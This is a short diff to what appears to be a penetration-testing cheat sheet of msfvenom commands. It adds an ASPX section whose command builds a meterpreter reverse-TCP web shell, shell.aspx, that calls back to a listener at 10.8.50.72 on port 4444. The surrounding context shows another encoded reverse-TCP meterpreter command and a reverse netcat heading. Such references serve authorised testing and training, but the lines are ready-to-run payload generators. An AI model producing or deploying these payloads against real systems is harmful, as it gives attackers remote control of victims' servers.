@@ -125,6 +125,11 @@ $ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_na
 This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly.
 ```
 
+### ASPX
+```console
+$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx
+```
+
 ### Reverse nc
 
 ```console
